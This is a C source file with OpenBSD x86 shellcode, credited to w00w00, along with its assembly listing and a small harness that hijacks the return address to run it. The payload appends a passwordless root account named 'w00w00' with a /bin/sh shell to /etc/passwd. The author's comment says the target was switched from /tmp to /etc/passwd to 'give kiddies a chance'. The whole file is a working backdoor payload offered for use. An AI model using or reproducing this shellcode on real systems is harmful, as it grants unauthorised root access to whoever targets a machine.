#include <string.h>

/* 
   OpenBSD shellcode that adds an unpassworded root login
   "w00w00" to /etc/passwd... Courtesy of w00w00.
   (Changed from /tmp/passwd to /etc/passwd... give kiddies a chance ;)
 */

/*
    jmp 43
    popl %esi
    xorl %eax,%eax
    movb %eax,11(%esi)
    movb %eax,41(%esi)
    pushl %eax
    movb $9,%al
    pushl %eax
    xorl %eax,%eax
    pushl %esi
    pushl %eax
    movb $0x5,%al
    int $0x80

    movl %eax,%ebx
    pushl $29
    leal 12(%esi),%eax
    pushl %eax
    pushl %ebx
    pushl %eax
    xorl %eax,%eax
    movb $0x4,%al
    int $0x80

    xorl %eax,%eax
    movb $0x1,%al
    int $0x80
  
  chaine:
      call   -48
      .ascii \"/etc/passwd0\"
      .ascii \"w00w00::0:0:w00w00:/:/bin/sh\n0\"  # 29
      .byte 0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff
      .byte 0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff
      .byte 0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff
      .byte 0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff
      .byte 0x00
*/

char shell[]=
"\xeb\x2b\x5e\x31\xc0\x88\x46\x0b"
"\x88\x46\x29\x50\xb0\x09\x50\x31"
"\xc0\x56\x50\xb0\x05\xcd\x80\x89"
"\xc3\x6a\x1d\x8d\x46\x0c\x50\x53"
"\x50\x31\xc0\xb0\x04\xcd\x80\x31"
"\xc0\xb0\x01\xcd\x80\xe8\xd0\xff"
"\xff\xff\x2f\x65\x74\x63\x2f\x70"
"\x61\x73\x73\x77\x64\x30\x77\x30"
"\x30\x77\x30\x30\x3a\x3a\x30\x3a"
"\x30\x3a\x77\x30\x30\x77\x30\x30"
"\x3a\x2f\x3a\x2f\x62\x69\x6e\x2f"
"\x73\x68\x0a\x30\xff\xff\xff\xff"
"\xff\xff\xff\xff\xff\xff\xff\xff"
"\xff\xff\xff\xff\xff\xff\xff\xff";

main()
{
   int *ret;
   printf("\n%d\n",sizeof(shell));
   ret=(int*)&ret+2;
   (*ret)=(int)shell;
}
